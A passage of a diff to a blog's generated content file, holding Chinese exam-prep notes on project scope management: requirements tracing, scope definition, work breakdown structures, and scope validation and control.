+<h4 id="需求文件"><a href="#需求文件" class="headerlink" title="需求文件"></a>需求文件</h4><p>&emsp;&emsp;<font color="red">收集需求过程的主要输出有需求文件(Requirements Documentation)和需求跟踪矩阵</font>。需求文件描述各种单一的需求将如何满足与项目相关的业务需求。</p>
+<p>需求文件的内容包括（但不限千）以下几个方面：</p>
+<ul>
+<li>业务需求</li>
+<li>干系人需求</li>
+<li>解决方案需求</li>
+<li>项目需求</li>
+<li>过度需求</li>
+<li>与需求有关的假设条件、依赖关系和制约因素</li>
+</ul>
+<h4 id="需求跟踪"><a href="#需求跟踪" class="headerlink" title="需求跟踪"></a>需求跟踪</h4><p>&emsp;&emsp;需求管理包括在<font color="red"><strong>产品开发过程中</strong></font>维持需求—致性和精确性的所有活动， 包括控制需求基线， 保持项目计划与需求—致， 控制单个需求和需求文档的版本情况， 管理需求和联系链之间的联系， 或管理单个需求和项目其他可交付物之间的依赖关系， 跟踪基线中需求的状态。</p>
+<p>&emsp;&emsp;可跟踪性是项目需求的一个重要特征， 需求跟踪是将单个需求和其他元素之间的依赖关系和逻辑联系建立跟踪， 这些元素包括各种类型的需求、业务规则、系统组件， 以及帮助文件等。</p>
+<h5 id="需求跟踪的内容"><a href="#需求跟踪的内容" class="headerlink" title="需求跟踪的内容"></a>需求跟踪的内容</h5><p>&emsp;&emsp;每个配置项的需求到其涉及的产品（或构件）需求都要具有双向可跟踪性。所谓<font color="red"><strong>双向跟踪</strong></font>， 包括正向跟踪和反向跟踪， 正向跟踪是指检查需求文件中的每个需求是否都能在后继工作产品（成果） 中找到对应点；反向跟踪也称为逆向跟踪， 是指检查设计文档、产品构件、测试文档等工作成果是否都能在需求文件中找到出处。具体来说， 需求跟踪涉及五种类型， 如图5-1所示。</p>
+<p><img src="https://s2.loli.net/2022/04/02/sbAizWrZJOt8hE5.png" alt="image-20220402150159966"></p>
+<p>&emsp;&emsp;<font color="red">箭头表示需求跟踪能力联系链， 它能跟踪需求使用的整个周期， 即从需求建议到交付的全过程。</font></p>
+<p>&emsp;&emsp;<font color="red">从用户原始需求可向前追溯到需求文件， 这样就能区分出项目过程中或项目结束后由千变更受到影响的需求， 也确保了需求文件中包括所有用户需求。同样， 可以从需求文件回溯到相应的用户原始需求， 确认每个需求的出处。</font></p>
+<h5 id="需求跟踪矩阵"><a href="#需求跟踪矩阵" class="headerlink" title="需求跟踪矩阵"></a>需求跟踪矩阵</h5><p>&emsp;&emsp;表示需求和其他产品元素之间的联系链的最普遍方式是使用需求跟踪（能力） 矩阵，需求跟踪矩阵是将产品需求从其来源连接到能满足需求的可交付成果的一种表格。</p>
+<p><img src="https://s2.loli.net/2022/04/02/SNiUlG9vICEWgzK.png" alt="image-20220402151047596"></p>
+<p>&emsp;&emsp;应在需求跟踪矩阵中记录每个需求的相关属性， 这些属性有助于明确每个需求的关键信息。需求跟踪矩阵中记录的典型属性包括唯—标识、需求的文字描述、收录该需求的理由、所有者、来源、优先级别、版本、<strong>当前状态（例如， 进行中、已取消、已推迟、新增加、已批准、已分配、已完成等）</strong>和状态日期。</p>
+<h3 id="定义范围（过程三）"><a href="#定义范围（过程三）" class="headerlink" title="定义范围（过程三）"></a>定义范围（过程三）</h3><p>&emsp;&emsp;定义范围(Define Scope)是制定项目和产品详细描述的过程， 其主要作用是明确所收集的需求哪些将包含在项目范围内， 哪些将排除在项目范围外， 从而明确产品、服务或成果的边界。</p>
+<h4 id="定义范围的工具与技术"><a href="#定义范围的工具与技术" class="headerlink" title="定义范围的工具与技术"></a>定义范围的工具与技术</h4><p>定义范围过程的主要工具与技术有<font color="red">专家判断、产品分析、 备选方案生成和引导式研讨会</font>。 </p>
+<font color="red">产品分析(Product Analysis)是—种有效的工具。通常， 针对产品提问并回答， 形成对将要开发的产品的用途、特征和其他方面的描述</font>
+
+<font color="red">备选方案生成(Alternatives Generation)是—种用来指定尽可能多的潜在可选方案的技术， 用千识别执行项目工作的不同方法。</font>
+
+<h4 id="范围说明书"><a href="#范围说明书" class="headerlink" title="范围说明书"></a>范围说明书</h4><p>&emsp;&emsp;作为<font color="red">定义范围过程的主要成果， 项目范围说明书(Project Scope Statement)</font>是对项目范围、主要可交付成果、假设条件和制约因素的描述。项目范围说明书记录了整个范围， 包括项目范围和产品范围， 详细描述项目的可交付成果， 以及为提交这些可交付成果而必须开展的工作。</p>
+<font color="red">项目范围说明书包括如下内容：</font>
+
+<ol>
+<li><font color="red">产品范围描述</font></li>
+<li><font color="red">验收标准。定义可交付成果通过验收前必须满足的一系列条件， 以及验收的过程。</font></li>
+<li><font color="red">可交付成果。</font></li>
+<li><font color="red">项目的除外责任。</font></li>
+<li><font color="red">制约因素。列出并说明与项目范围有关且限制项目团队选择的具体项目制约因素</font></li>
+<li><font color="red">假设条件。</font>
+
+</li>
+</ol>
+<p>项目范围说明书的主要作用如下:</p>
+<pre><code>(1)确定范围
+(2)沟通基础
+(3)规划和控制依据。
+(4)变更基础。
+(5)规划基础。
+</code></pre><h3 id="创建工作分解结构（过程四）"><a href="#创建工作分解结构（过程四）" class="headerlink" title="创建工作分解结构（过程四）"></a>创建工作分解结构（过程四）</h3><p>创建WBS是将项目可交付成果和项目工作分解成较小的、更易于管理的组件的过程</p>
+<h4 id="WBS的层次"><a href="#WBS的层次" class="headerlink" title="WBS的层次"></a>WBS的层次</h4><p>&emsp;&emsp;<font color="red">里程碑标志着某个可交付成果或者阶段的正式完成。重要的检查点是里程碑、重要的里程碑是基线</font></p>
+<p>&emsp;&emsp;<font color="red">工作包(Work Package)是位于WBS每条分支最底层的可交付成果或项目工作组成部分。工作包应该非常具体， 以便承担者能明确自己的任务、努力的目标和承担的责任。8/80规则(80小时原则）建议工作包的大小应该至少需要8小时来完成， 而总完成时间也不应该大于80小时。即工作一天（8小时）到两周（5X8X2=80小时）</font></p>
+<p>&emsp;&emsp;<strong>控制账户(Control Account) 是—种管理控制点。控制账户是WBS某个层次上的要素， 既可以是工作包， 也可以是比工作包更高层次上的一个要素。如果是后—种情况，一个控制账户中就包括若干个工作包， 但一个工作包仅属于一个控制账户。项目管理团队在控制账户上考核项目的执行情况， 即在控制账户的相应要素下， 将项目执行情况与计划情况进行比较， 以便评价执行情况好坏， 并发现与纠正偏差。</strong></p>
+<p>&emsp;&emsp;<strong>规划包(Planning Package)是指在控制账户之下，工作内容已知但尚缺详细进度活动的WBS组成部分。规划包是在控制账户之下、工作包之上的WBS要素。随着情况的逐渐清晰， 规划包最终将被分解成工作包以及相应的具体活动。</strong></p>
+<p>&emsp;&emsp;在制作WBS的过程中， 要给WBS的每个部分赋予—个账户编码(Code of Account)标志符， 它们是成本、进度和资源使用信息汇总的层次结构。需要生成—些配套的文件，这些文件需要和WBS配套使用， 称为WBS词典。WBS词典也称为WBS词汇表， 它是描述WBS各组成部分的文件。</p>
+<h4 id="分解"><a href="#分解" class="headerlink" title="分解"></a>分解</h4><p>创建WBS 过程的工具与技术主要有分解和专家判断。</p>
+<font color="red">要将整个项目工作分解为工作包， 通常需要开展以下活动：</font>
+
+<ol>
+<li><font color="red">识别和分析可交付成果及相关工作。</font></li>
+<li><font color="red">确定WBS的结构和编排方法。</font></li>
+<li><font color="red">自上而下逐层细化分解。</font></li>
+<li><font color="red">为WBS组件制定和分配标识编码。</font></li>
+<li><font color="red">核实可交付成果分解的程度是恰当的。</font>
+
+</li>
+</ol>
+<h5 id="分解的原则"><a href="#分解的原则" class="headerlink" title="分解的原则"></a>分解的原则</h5><p>创建WBS时对工作的划分， 可以参考一些现成的原则， 这些原则包括：</p>
+<pre><code>(1)功能或者技术原则。在创建WBS时，需要考虑将不同人员的工作分开。
+(2)组织结构。对于职能型的项目组织而言， WBS也要适应项目的组织结构形式，
+(3)系统或者子系统。总的系统划分为几个主要的子系统， 然后对每个子系统再进行分解。
+</code></pre><font color="red">在项目管理实践中， 可以按照下列方式进行分解：</font>
+
+<ol>
+<li><font color="red">项目生命周期的各阶段作为分解的第二层， 产品和项目可交付成果放在第三层</font></li>
+<li><font color="red">主要可交付成果作为分解的第二层（将子项目作为分解的第二层）</font>
+
+</li>
+</ol>
+<h5 id="工作过程"><a href="#工作过程" class="headerlink" title="工作过程"></a>工作过程</h5><font color="red">WBS不是某个项目团队成员的责任，应该由**全体项目团队成员、用户和项目干系人**共同完成和一致确认。</font>
+
+<font color="red">较常用的WBS表示形式主要有分级的树型结构（组织结构图式）和表格形式（列表式）。</font>
+
+<font color="red">树型结构图的WBS层次清晰、直观性和结构性强， 但不容易修改， 对大的、复杂的项目很难表示出项目的全貌；表格形式的直观性比较差，但能够反映出项目所有的工作要素。</font>
+
+<p>值得注意的是，虽然有些参考文献也使用鱼骨图形式的WBS，但这种形式并不常用。</p>
+<h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><p>在分解的过程中 ， 应该注意以下8个方面：</p>
+<ol>
+<li><font color="red">WBS必须是面向可交付成果的</font>。项目的目标是提供产品或服务， 仅仅是—连串特别的活动。</li>
+<li><font color="red">WBS必须符合项目的范围。WBS必须包括， 也仅包括为了完成项目的可交付成果的活动。</font></font></li>
+<li>WBS的底层应该支持计划和控制。WBS是项目管理计划和项目范围之间的桥梁，WBS的底层不但要支持项目管理计划， 而且要让管理层能够监视和控制项目的进度和预算</li>
+<li><font color="red">WBS中的元素必须有人负责， 而且只由一个人负责， 尽管实际上可能需要多个人参与。</font></li>
+<li><font color="red">WBS的指导。作为指导而不是原则， WBS应控制在4~6层。</font></li>
+<li><font color="red">WBS应包括项目管理工作（因为管理是项目具体工作的一部分），也要包括分包出去的工作。</font></li>
+<li><font color="red">WBS的编制需要所有（主要）项目干系人的参与， 需要项目团队成员的参与。</font></li>
+<li>WBS 并非是— 成不变的。在完成了WBS 之后的工作中， 仍然有可能需要对WBS进行修改。</li>
+<li><font color="red">一个下层只可以有一个上层，一个上层可以有多个下层，避免交叉从属</font>
+
+</li>
+</ol>
+<h4 id="WBS的作用"><a href="#WBS的作用" class="headerlink" title="WBS的作用"></a>WBS的作用</h4><p>当一个项目的WBS分解完成后， 项目干系人对完成的WBS应该给予确认，WBS的目的和用途主要体现在以下8个方面：</p>
+<pre><code>(1)明确和准确说明项目范围，项目团队成员能够清楚地理解任务的性质和需要努力的方向。
+(2)清楚地定义项目的边界
+(3)为各独立单元分派人员，规定这些人员的职责，可以确定完成项目所需要的技术和人力资源。
+(4)针对独立单元，进行时间、成本和资源需求量的估算，提高估算的准确性。
+(5)为计划、预算、进度安排和费用控制奠定共同基础，确定项目进度和控制的基准。
+(6)将项目工作和项目的财务账目联系起来。
+(7)确定工作内容和工作顺序， 将项目分解成具体的工作任务，就可以按照工作任务的逻辑顺序来实施项目。WBS可以使用图形化的方式来查看工作内容，任何人都能够清楚地辨别项目的阶段、工作单元，并根据实际情况进行调节和控制。
+(8)有助于防止需求蔓延。
+</code></pre><h3 id="确认范围（过程五）"><a href="#确认范围（过程五）" class="headerlink" title="确认范围（过程五）"></a>确认范围（过程五）</h3><p>确认范围(Validate Scope)是正式验收项目已完成的可交付成果的过程，确认范围包括与客户或发起人一起审查可交付成果， 确保可交付成果已圆满完成， 并获得客户或发起人的正式验收。</p>
+<h4 id="确认范围概述"><a href="#确认范围概述" class="headerlink" title="确认范围概述"></a>确认范围概述</h4><p>确认范围的主要工具与技术是检查和群体决策技术。检查也称为审查、 评审、审计、走查、 巡检、测试等</p>
+<h5 id="确认范围的步骤"><a href="#确认范围的步骤" class="headerlink" title="确认范围的步骤"></a>确认范围的步骤</h5><p>确认范围应该贯穿项目的始终，确认范围的一般步骤如下：</p>
+<pre><code>(1)确定需要进行范围确认的时间。
+(2)识别范围确认需要哪些投入。
+(3)确定范围正式被接受的标准和要素。
+(4)确定范围确认会议的组织步骤。
+(5)组织范围确认会议。
+</code></pre><h5 id="需要检查的问题"><a href="#需要检查的问题" class="headerlink" title="需要检查的问题"></a>需要检查的问题</h5><p>项目干系人进行范围确认时，一般需要检查以下6个方面的问题：</p>
+<pre><code>(1)可交付成果是否是确定的、可确认的。
+(2)每个可交付成果是否有明确的里程碑， 里程碑是否有明确的、可辨别的事件，例如， 客户的书面认可等。
+(3)是否有明确的质量标准
+(4)审核和承诺是否有清晰的表达。
+(5)项目范围是否覆盖了需要完成的产品或服务进行的所有活动， 有没有遗漏或者错误。
+(6)项目范围的风险是否太高， 管理层是否能够降低可预见的风险发生时对项目的冲击。
+</code></pre><h4 id="干系人关注点"><a href="#干系人关注点" class="headerlink" title="干系人关注点"></a>干系人关注点</h4><p>考过几次，可以关注一下：</p>
+<p>&emsp;&emsp;管理层所关注的项目范围， 是指范围对项目的进度、资金和资源的影响， 这些因素是否超过了组织承受范围， 是否在投入产出上具有合理性。</p>
+<p>&emsp;&emsp;客户主要关心的是产品的范围， 关心项目的可交付成果是否足够完成产品或服务。</p>
+<p>&emsp;&emsp;项目管理人员主要关注可交付成果是否足够和必须完成，时间、资金和资源是否足够，主要的潜在风险和预备解决的方法。</p>
+<p>&emsp;&emsp;项目团队成员主要关心项目范围中自己参与的元素和负责的元素， 通过定义范围中的时间检查自己的工作时间是否足够， 自己在项目范围中是否有多项工作， 而这些工作又有冲突的地方。</p>
+<h4 id="几个术语的比较"><a href="#几个术语的比较" class="headerlink" title="几个术语的比较"></a>几个术语的比较</h4><ol>
+<li><p>确认范围与核实产品<br>核实产品是针对产品是否完成， 在项目（或阶段）结束时由发起人或客户来验证，强调产品是否完整； 确认范围是针对项目可交付成果， 由客户或发起人在阶段末确认验收的过程。</p>
+</li>
+<li><p>确认范围与质量控制</p>
+<font color="red">确认范围与质量控制的不同之处在于：</font>
+
+<ul>
+<li><font color="red">确认范围主要强调可交付成果获得客户或发起人的接受；质量控制强调可交付成果的正确性， 并符合为其制定的具体质量要求（质量标准）。</font></li>
+<li><font color="red">质量控制一般在确认范围前进行，也可同时进行；确认范围一般在阶段末尾进行，而质量控制并不—定在阶段未进行。</font></li>
+<li><font color="red"><font color="red">质量控制属内部检查， 由执行组织的相应质量部门实施；确认范围则是由外部干系人（客户或发起人）对项目可交付成果进行检查验收。</font></li>
+</ul>
+</li>
+<li>确认范围与项目收尾<pre><code>确认范围与项目收尾的不同之处在于：
+- 虽然确认范围与项目收尾工作都在阶段未进行， 但确认范围强调的是核实与接受
+    可交付成果， 而项目收尾强调的是结束项目（或阶段）所要做的流程性工作。
+- 确认范围与项目收尾都有验收工作， 确认范围强调验收项目可交付成果， 项目收
+    尾强调验收产品。
+</code></pre></li>
+</ol>
+<h3 id="控制范围（过程六）"><a href="#控制范围（过程六）" class="headerlink" title="控制范围（过程六）"></a>控制范围（过程六）</h3><p>控制范围(Control Scope)是监督项目和产品的范围状态、管理范围基准变更的过程</p>
+<h4 id="范围变更的原因"><a href="#范围变更的原因" class="headerlink" title="范围变更的原因"></a>范围变更的原因</h4><p>造成项目范围变更的主要原因是项目外部环境发生了变化， 例如：</p>
+<ul>
+<li><font color="red">政府政策的问题。</font></li>
+<li><font color="red">项目范围的计划编制不周密详细， 有—定的错误或遗漏。</font></li>
+<li><font color="red">市场上出现了或是设计人员提出了新技术、新手段或新方案。</font></li>
+<li><font color="red">项目执行组织本身发生变化。</font></li>
+<li><font color="red">客户对项目、项目产品或服务的要求发生变化。</font>
+
+</li>
+</ul>
+<h4 id="范围变更的工作"><a href="#范围变更的工作" class="headerlink" title="范围变更的工作"></a>范围变更的工作</h4><p>范围变更控制的主要工作如下：</p>
+<ol>
+<li>影响导致范围变更的因素， 并尽量使这些因素向有利的方面发展。</li>
+<li>判断范围变更是否已经发生。</li>
+<li>范围变更发生时管理实际的变更，确保所有被请求的变更按照项目整体变更控制过程处理。</li>
 </ol>
 ]]></content>
       <categories>
@@ -2110,263 +2374,6 @@ IGMP允许Internet中的计算机参加多播， 是计算机用做向相邻多�
 <li>假设情景分析就是对“情景X出现时应当如何处理”这样的问题进行分析。</li>
 <li>在执行计划过程中，可以明确工作重点，对各个关键活动加以有效控制和调度，避免资源的增加可能会导致额外问题的产生从而降低效率。</li>
 <li>项目经理已经对项目进度表提出了几项修改。在某些情况下，进度延迟变得严重时，为了确保获得精确的绩效衡量信息，项目经理应该尽快重新修订项目进度计划。</li>
-</ol>
-]]></content>
-      <categories>
-        <category>软考</category>
-      </categories>
-      <tags>
-        <tag>Textual Criticism</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>项目范围管理</title>
-    <url>/2022/03/31/%E9%A1%B9%E7%9B%AE%E8%8C%83%E5%9B%B4%E7%AE%A1%E7%90%86/</url>
-    <content><![CDATA[<font color="red">### 10大管理学习主线</font>
-
-<ol>
-<li><font color="red">每个管理领域有哪些过程？</font></li>
-<li><font color="red">每个过程的输入（做XX的依据）、输出（做XX的结果）、工具和技术（用XX方法和工具）是什么？</font></li>
-<li><font color="red">每个管理领域有什么问题，应该怎么解决？</font></li>
-<li><font color="red">每个管理领域和其余管理领域的关系是什么？</font>
-
-</li>
-</ol>
-<font color="red">凡是监控过程，输入一定包含计划和绩效，结果必定包含变更和更新</font>
-
-<font color="red">凡XX管理必定输出XX管理计划，作用是为管理XX提供指南和方向</font>
-
-<font color="red">编写XX计划的工具和技术一定有专家判断和会议</font>
-
-<h3 id="范围管理概述"><a href="#范围管理概述" class="headerlink" title="范围管理概述"></a>范围管理概述</h3><p>&emsp;&emsp;项目范围管理需要做以下三个方面的工作：</p>
-<pre><code>(1)明确项目边界，即明确哪些工作是包括在项目范围之内的，哪些工作是不包括在项目范围之内的。
-(2)对项目执行工作进行监控，确保所有该做的工作都做了，而且没有多做。对不包括在项目范围内的额外工作说 “不“， 杜绝做额外工作。
-(3)防止项目范围发生蔓延。范围蔓延是指未对时间、成本和资源做相应调整，未经控制的产品或项目范围的扩大。
-</code></pre><h4 id="产品范围与项目范围"><a href="#产品范围与项目范围" class="headerlink" title="产品范围与项目范围"></a>产品范围与项目范围</h4><p>&emsp;&emsp;产品范围是指产品或者服务所应该包含的功能<strong>（技术主线）</strong>， 项目范围是指为了能够交付产品，项目所必须做的工作<strong>（管理主线）</strong>。</p>
-<p>&emsp;&emsp;产品范围是项目范围的基础， 产品范围的定义是产品要求的描述， 而项目范围的定义是产生项目管理计划的基础</p>
-<p>&emsp;&emsp;<font color="red">项目的范围基准(Scope Baseline)是<strong>经过批准的</strong>项目范围说明书、WBS(Work Breakdown Structure)和WBS词典。</font>判断项目范围是否完成， 要以范围基准来衡量。而产品范围是否完成， 则根据产品是否满足了产品描述来判断。</p>
-<p>&emsp;&emsp;产品范围描述是项目范围说明书的重要组成部分， 因此， 产品范围变更后， 首先受到影响的是项目的范围。</p>
-<h4 id="范围管理的重要性"><a href="#范围管理的重要性" class="headerlink" title="范围管理的重要性"></a>范围管理的重要性</h4><p>无重要考点</p>
-<h4 id="范围管理的过程"><a href="#范围管理的过程" class="headerlink" title="范围管理的过程"></a>范围管理的过程</h4><p>&emsp;&emsp;项目范围管理主要是通过<font color="red"><strong>规划范围管理、收集需求、定义范围、创建WBS、 确认范围和控制范围</strong></font>六个过程来实现的。 </p>
-<p><img src="https://s2.loli.net/2022/03/31/xUKpGosDPrgZuHd.png" alt="image-20220331134553187"></p>
-<p><img src="https://s2.loli.net/2022/03/31/VZBlMpG2ejQxotb.png" alt="image-20220331134618528"></p>
-<h3 id="规划范围管理（过程一）"><a href="#规划范围管理（过程一）" class="headerlink" title="规划范围管理（过程一）"></a>规划范围管理（过程一）</h3><p>&emsp;&emsp;规划范围管理(Plan Scope Management)是<font color="red"><strong>编制范围管理计划</strong></font>， 书面描述将如何定义、 确认和控制项目范围的过程， <font color="red"><strong>其主要作用是在整个项目中对如何管理范围提供指南和方向</strong>。</font></p>
-<p>&emsp;&emsp;规划范围管理过程的输入有<font color="red"><strong>项目管理计划、项目章程</strong></font>、<strong>事业环境因素和组织过程资产</strong>， 使用的工具与技术有<strong>专家判断和会议</strong>， 输出有<font color="red"><strong>范围管理计划和需求管理计划</strong></font>。本节主要简单介绍范围管理计划和需求管理计划。</p>
-<h4 id="范围管理计划"><a href="#范围管理计划" class="headerlink" title="范围管理计划"></a>范围管理计划</h4><font color="red">范围管理计划是制订项目管理计划过程和其他范围管理过程的主要输入， 要对将用于下列工作的管理过程做出规定：</font>
-
-<ul>
-<li><font color="red">如何制订项目范围说明书。</font></li>
-<li><font color="red">如何根据范围说明书创建WBS。</font></li>
-<li><font color="red">如何维护和批准WBS。</font></li>
-<li><font color="red">如何确认和正式验收已完成的项目可交付成果。</font></li>
-<li><font color="red">如何处理项目范围说明书的变更， 该工作与实施整体变更控制过程直接相联。</font>
-
-</li>
-</ul>
-<p>&emsp;&emsp;<strong>项目范围管理计划（同其他管理计划）</strong>可能在项目管理计划之中，也可能作为单独的一项。根据不同的项目，可以是详细的或者概括的， 可以是正式的或者非正式的。</p>
-<h4 id="需求管理计划"><a href="#需求管理计划" class="headerlink" title="需求管理计划"></a>需求管理计划</h4><p>&emsp;&emsp;需求管理贯穿于整个过程， 它的最基本的任务就是<strong>明确需求</strong>， 并使项目团队和用户<strong>达成共识</strong>， 即建立需求基线。另外， 还要<strong>建立需求跟踪能力联系链</strong>，确保所有用户需求都被正确地应用， 并且在需求发生变更时， 能够完全地控制其影响范围， 始终保持产品与需求的一致性。</p>
-<p>需求管理计划主要包括以下内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1)如何规划、跟踪和汇报各种需求活动</span><br><span class="line">(2)需求管理需要使用的资源。</span><br><span class="line">(3)培训计划。</span><br><span class="line">(4)项目干系人参与需求管理的策略。</span><br><span class="line">(5)判断项目范围与需求不一致的准则和纠正规程。</span><br><span class="line">(6)需求跟踪结构</span><br><span class="line">(7)配置管理活动</span><br></pre></td></tr></table></figure>
-<h3 id="收集需求（过程二）"><a href="#收集需求（过程二）" class="headerlink" title="收集需求（过程二）"></a>收集需求（过程二）</h3><h4 id="需求的分类"><a href="#需求的分类" class="headerlink" title="需求的分类"></a>需求的分类</h4><font color="red">(1) 业务需求：整个组织的高层级需要， 例如， 解决业务间题或抓住业务机会，以及实施项目的原因。</font>
-<font color="red">(2)干系人需求：是指干系人或干系人群体的需要。</font>
-(3)解决方案需求： 是为满足业务需求和干系人需求， 产品、服务或成果必须具备的特性、功能和特征。解决方案需求又进一步分为功能需求和非功能需求。
-(4)过渡需求： 从当前状态过渡到将来状态所需的临时能力， 例如， 数据转换和培训需求。
-(5)项目需求： 项目需要满足的行动、过程或其他条件。
-<font color="red">(6)质量需求： 用于确认项目可交付成果的成功完成或其他项目需求的实现的任何条件或标准。QFD对质量需求进行了细分， 分为**基本需求、期望需求和意外需求**。</font>
-
-<h4 id="收集需求的工具与技术"><a href="#收集需求的工具与技术" class="headerlink" title="收集需求的工具与技术"></a>收集需求的工具与技术</h4><p>&emsp;&emsp;<font color="red">收集需求的工具与技术主要有访谈、焦点小组、引导式研讨会、群体创新技术、群体决策技术、问卷调查、观察、原型法、标杆对照、系统交互图、文件分析等。</font></p>
-<h5 id="焦点小组"><a href="#焦点小组" class="headerlink" title="焦点小组"></a>焦点小组</h5><p>&emsp;&emsp;<font color="red">焦点小组将<strong>预先选定的干系人和主题专家</strong>集中在—起， 了解他们对所提议产品、服务或成果的期望和态度。由一位受过训练的主持人引导大家进行互动式讨论。焦点小组往往比一对—的访谈更加热烈。</font><br>&emsp;&emsp;<font color="red">焦点小组是—种群体访谈而非一对一访谈， 可以有6~10个被访谈者参加。针对访谈者提出的问题， 被访谈者之间开展互动式讨论， 以求得到更有价值的意见。</font></p>
-<h5 id="引导式研讨会"><a href="#引导式研讨会" class="headerlink" title="引导式研讨会"></a>引导式研讨会</h5><p>&emsp;&emsp;<font color="red">通过邀请<strong>主要的跨职能干系人</strong>一起参加会议， 引导式研讨会(Facilitated Workshop)对产品需求进行集中讨论与定义。研讨会是快速定义跨职能需求和协调干系人差异的重要技术。由于群体互动的特点， 被有效引导的研讨会有助于建立信任、促进关系、改善沟通， 从而有利于参加者达成一致意见。该技术的另—个好处是， 能够比单项会议更快地发现和解决问题。</font></p>
-<h5 id="群体创新技术"><a href="#群体创新技术" class="headerlink" title="群体创新技术"></a>群体创新技术</h5><p>&emsp;&emsp;<font color="red">群体创新技术(Group Creativity Technique)是指可以组织一些群体活动来识别项目和产品需求， 群体创新技术包括头脑风暴法、名义小组技术、德尔菲技术、概念／思维导图、亲和图和多标准决策分析等。</font></p>
-<ul>
-<li><font color="red">头脑风暴(Brain Storming, BS)法又称为智力激励法、自由思考法或集思广益法：各抒己见</font>
-</li>
-<li><font color="red">名义小组技术(Nominal Group Technique)**通过投票来排列最有用的创意**， 以便进行进—步的头脑风暴或优先排序。名义小组技术是头脑风暴法的深化应用， 是更加结构化的头脑风暴法</font>
-</li>
-<li><font color="red">德尔菲技术(Delphi Technique)：防止个人的观点被不正确的放大</font>
-</li>
-<li><font color="red">思维导图(Mind Mapping)又称为心智图， 是将从头脑风暴中获得的创意， 用一张简单的图联系起来， 以反映这些创意之间的共性与差异， 从而引导出新的创意。</font>
-</li>
-<li><font color="red">亲和图(Affinity Diagram)又称为KJ法， 是针对某一间题， 充分收集各种经验、知识、想法和意见等语言、文字资料， 通过图解方式进行汇总， 并按其相互亲和性归纳整理这些资料， 使间题明确起来， 求得统—认识， 以利千解决的—种方法。</font>
-
-<font color="red">亲和图的核心是头脑风暴法， 是根据结果去找原因。</font>
-</li>
-<li><font color="red">多标准决策分析(Multi-Criteria Decision Analysis)是借助决策矩阵， 用系统分析方法建立诸如风险水平、不确定性和价值收益**等多种标准**， 从而对众多方案进行评估和排序的一种技术。</font>
-
-</li>
-</ul>
-<h5 id="群体决策"><a href="#群体决策" class="headerlink" title="群体决策"></a>群体决策</h5><p>&emsp;&emsp;<font color="red">群体决策(Group Decision-Making)就是为达成某种期望结果而对多个未来行动方案进行评估：</font></p>
-<ul>
-<li><font color="red">—致同意(Unanimity)。所有人都同意某个行动方案。</font></li>
-<li><font color="red">大多数原则(Majority)。获得群体中50％以上的人的支持， 就能做出决策。参与决策的人数定为奇数， 防止因平局而无法达成决策。</font></li>
-<li><font color="red">相对多数原则(Plurality)。根据群体中相对多数者的意见做出决定， 即便未能获得一部分人的支持。通常在候选项超过两个时使用该原则， 例如， 某个软件构件的功能有3种实现方案（标记为A、B、C) ， 在群体决策时， 同意A方案的人有40%， 同意B方案的人有35%， 同意C方案的人有25%， 则最终确定采用A方案。</font></li>
-<li><font color="red">独裁(Dictatorship)。由某一个人（例如， 项目经理）为群体做出决策。</font>
-
-</li>
-</ul>
-<h5 id="原型法"><a href="#原型法" class="headerlink" title="原型法"></a>原型法</h5><p>&emsp;&emsp;<font color="red">原型法(Prototype) 是一种根据干系人初步需求， 利用产品开发工具， 快速地建立一个产品模型展示给干系人， 在此基础上与干系人交流， 最终实现干系人需求的产品快速开发的方法。</font></p>
-<h5 id="标杆对照"><a href="#标杆对照" class="headerlink" title="标杆对照"></a>标杆对照</h5><p>&emsp;&emsp;<font color="red">标杆对照(Benchmarking)将实际或计划的做法与<strong>其他类似组织</strong>的做法（例如， 流程、操作过程等）进行比较， 以便识别最佳实践， 形成改进意见， 并为绩效考核提供依据。标杆对照所采用的＂类似组织” 可以是内部组织， 也可以是外部组织。</font></p>
-<h5 id="系统交互图"><a href="#系统交互图" class="headerlink" title="系统交互图"></a>系统交互图</h5><p>&emsp;&emsp;<font color="red">系统交互图(ContextDiagram)是范围模型的一个例子， 它是对产品范围的可视化描述， 显示系统（过程、设备、信息系统等）与参与者（用户、独立于本系统之外的其他系统）之间的交互方式。系统交互图显示了业务系统的输入、输入提供者、业务系统的输出和输出接收者</font></p>
-<h5 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h5><p>&emsp;&emsp;<font color="red">文件分析(Document Analysis)就是通过分析现有文档，识别与需求相关的信息来挖掘需求。可供分析的文档很多，包括商业计划、营销文档、协议、招投标文件、建议邀请书、业务流程、逻辑数据模型、业务规则库、应用软件文档、用例文档、其他需求文档、间题日志、政策、程序和法规文件等。</font></p>
-<h4 id="需求文件"><a href="#需求文件" class="headerlink" title="需求文件"></a>需求文件</h4><p>&emsp;&emsp;<font color="red">收集需求过程的主要输出有需求文件(Requirements Documentation)和需求跟踪矩阵</font>。需求文件描述各种单一的需求将如何满足与项目相关的业务需求。</p>
-<p>需求文件的内容包括（但不限千）以下几个方面：</p>
-<ul>
-<li>业务需求</li>
-<li>干系人需求</li>
-<li>解决方案需求</li>
-<li>项目需求</li>
-<li>过度需求</li>
-<li>与需求有关的假设条件、依赖关系和制约因素</li>
-</ul>
-<h4 id="需求跟踪"><a href="#需求跟踪" class="headerlink" title="需求跟踪"></a>需求跟踪</h4><p>&emsp;&emsp;需求管理包括在<font color="red"><strong>产品开发过程中</strong></font>维持需求—致性和精确性的所有活动， 包括控制需求基线， 保持项目计划与需求—致， 控制单个需求和需求文档的版本情况， 管理需求和联系链之间的联系， 或管理单个需求和项目其他可交付物之间的依赖关系， 跟踪基线中需求的状态。</p>
-<p>&emsp;&emsp;可跟踪性是项目需求的一个重要特征， 需求跟踪是将单个需求和其他元素之间的依赖关系和逻辑联系建立跟踪， 这些元素包括各种类型的需求、业务规则、系统组件， 以及帮助文件等。</p>
